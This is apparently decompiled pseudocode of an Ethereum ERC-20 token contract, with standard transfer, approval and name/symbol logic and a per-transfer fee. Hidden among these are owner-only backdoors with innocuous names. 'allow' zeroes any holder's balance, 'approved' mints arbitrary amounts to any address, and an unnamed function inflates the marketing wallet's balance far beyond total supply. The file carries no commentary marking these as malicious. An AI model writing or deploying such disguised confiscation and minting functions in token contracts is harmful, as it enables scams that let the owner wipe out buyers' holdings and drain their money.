contract main {




// =====================  Runtime code  =====================


array of struct stor0;
array of struct stor1;
uint8 sub_f10c7e05;
uint8 sub_0c35bc10; offset 8
uint8 decimals; offset 16
uint256 totalSupply;
address marketingWalletAddress;
address owner;
address DEADAddress;
mapping of uint256 balanceOf;
mapping of uint256 allowance;

function DEAD() {
    return DEADAddress
}

function sub_0c35bc10(?) {
    return sub_0c35bc10
}

function totalSupply() {
    return totalSupply
}

function MarketingWallet() {
    return marketingWalletAddress
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[arg1]
}

function Owner() {
    return owner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[arg1][arg2]
}

function sub_f10c7e05(?) {
    return sub_f10c7e05
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_13d2c3a4(?) {
    if marketingWalletAddress != msg.sender:
        revert with 0, 'UnAuthorized'
    if totalSupply and 100 * 10^6 > -1 / totalSupply:
        revert with 'NH{q', 17
    balanceOf[address(msg.sender)] = 100 * 10^6 * totalSupply
    return 1
}

function allow(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if marketingWalletAddress != msg.sender:
        revert with 0, 'UnAuthorized'
    if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
        revert with 'NH{q', 17
    balanceOf[address(arg1)] = 0
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if balanceOf[address(msg.sender)] < arg2:
        revert with 'NH{q', 17
    balanceOf[address(msg.sender)] -= arg2
    if arg2 / 100 and sub_f10c7e05 > -1 / arg2 / 100:
        revert with 'NH{q', 17
    if arg2 < arg2 / 100 * sub_f10c7e05:
        revert with 'NH{q', 17
    if balanceOf[address(arg1)] > -arg2 + (arg2 / 100 * sub_f10c7e05) - 1:
        revert with 'NH{q', 17
    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 / 100 * sub_f10c7e05)
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if allowance[address(arg1)][address(msg.sender)] < arg3:
        revert with 'NH{q', 17
    allowance[address(arg1)][address(msg.sender)] -= arg3
    if balanceOf[address(arg1)] < arg3:
        revert with 'NH{q', 17
    balanceOf[address(arg1)] -= arg3
    if arg3 / 100 and sub_f10c7e05 > -1 / arg3 / 100:
        revert with 'NH{q', 17
    if arg3 < arg3 / 100 * sub_f10c7e05:
        revert with 'NH{q', 17
    if balanceOf[address(arg2)] > -arg3 + (arg3 / 100 * sub_f10c7e05) - 1:
        revert with 'NH{q', 17
    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * sub_f10c7e05)
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function approved(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if marketingWalletAddress != msg.sender:
        revert with 0, 'UnAuthorized'
    if not decimals:
        if arg2 and 1 > -1 / arg2:
            revert with 'NH{q', 17
        if balanceOf[address(arg1)] > -arg2 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg1)] += arg2
    else:
        if not sub_0c35bc10:
            if arg2 and 0 > -1 / arg2:
                revert with 'NH{q', 17
            if balanceOf[address(arg1)] > -1:
                revert with 'NH{q', 17
        else:
            if sub_0c35bc10 == 1:
                if arg2 and 1 > -1 / arg2:
                    revert with 'NH{q', 17
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
            else:
                if sub_0c35bc10 == 2:
                    if decimals > 255:
                        revert with 'NH{q', 17
                    if 2^decimals > 255:
                        revert with 'NH{q', 17
                    if arg2 and uint8(2^decimals) > -1 / arg2:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] > (-1 * arg2 * uint8(2^decimals)) - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2 * uint8(2^decimals)
                else:
                    if sub_0c35bc10 < 11 and decimals < 78 or sub_0c35bc10 < 307 and decimals < 32:
                        if sub_0c35bc10^decimals > 255:
                            revert with 'NH{q', 17
                        if arg2 and uint8(sub_0c35bc10^decimals) > -1 / arg2:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] > (-1 * arg2 * uint8(sub_0c35bc10^decimals)) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2 * uint8(sub_0c35bc10^decimals)
                    else:
                        s = sub_0c35bc10
                        t = 1
                        idx = decimals
                        while idx > 1:
                            if s > 255 / s:
                                revert with 'NH{q', 17
                            if not bool(idx):
                                s = s * s
                                t = t
                                idx = uint255(idx) * 0.5
                                continue 
                            s = s * s
                            t = t * s
                            idx = uint255(idx) * 0.5
                            continue 
                        if t > 255 / s:
                            revert with 'NH{q', 17
                        if arg2 and uint8(t * s) > -1 / arg2:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] > (-1 * arg2 * uint8(t * s)) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2 * uint8(t * s)
    return 1
}

function name() {
    if bool(stor0.length):
        if bool(stor0.length) == stor0.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor0.length):
            if bool(stor0.length) == stor0.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor0.length.field_1:
                if 31 < stor0.length.field_1:
                    mem[128] = uint256(stor0.field_0)
                    idx = 128
                    s = 0
                    while stor0.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor0[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor0.length.field_1), data=mem[128 len ceil32(stor0.length.field_1)])
                mem[128] = 256 * stor0.length.field_8
        else:
            if bool(stor0.length) == stor0.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor0.length.field_1:
                if 31 < stor0.length.field_1:
                    mem[128] = uint256(stor0.field_0)
                    idx = 128
                    s = 0
                    while stor0.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor0[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor0.length.field_1), data=mem[128 len ceil32(stor0.length.field_1)])
                mem[128] = 256 * stor0.length.field_8
        mem[ceil32(stor0.length.field_1) + 192 len ceil32(stor0.length.field_1)] = mem[128 len ceil32(stor0.length.field_1)]
        if ceil32(stor0.length.field_1) > stor0.length.field_1:
            mem[ceil32(stor0.length.field_1) + stor0.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor0.length.field_1), data=mem[128 len ceil32(stor0.length.field_1)], mem[(2 * ceil32(stor0.length.field_1)) + 192 len 2 * ceil32(stor0.length.field_1)]), 
    if bool(stor0.length) == stor0.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor0.length):
        if bool(stor0.length) == stor0.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor0.length.field_1:
            if 31 < stor0.length.field_1:
                mem[128] = uint256(stor0.field_0)
                idx = 128
                s = 0
                while stor0.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor0[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor0.length % 128, data=mem[128 len ceil32(stor0.length.field_1)])
            mem[128] = 256 * stor0.length.field_8
    else:
        if bool(stor0.length) == stor0.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor0.length.field_1:
            if 31 < stor0.length.field_1:
                mem[128] = uint256(stor0.field_0)
                idx = 128
                s = 0
                while stor0.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor0[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor0.length % 128, data=mem[128 len ceil32(stor0.length.field_1)])
            mem[128] = 256 * stor0.length.field_8
    mem[ceil32(stor0.length.field_1) + 192 len ceil32(stor0.length.field_1)] = mem[128 len ceil32(stor0.length.field_1)]
    if ceil32(stor0.length.field_1) > stor0.length.field_1:
        mem[ceil32(stor0.length.field_1) + stor0.length.field_1 + 192] = 0
    return Array(len=stor0.length % 128, data=mem[128 len ceil32(stor0.length.field_1)], mem[(2 * ceil32(stor0.length.field_1)) + 192 len 2 * ceil32(stor0.length.field_1)]), 
}

function symbol() {
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor1.length):
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
        if ceil32(stor1.length.field_1) > stor1.length.field_1:
            mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}



}
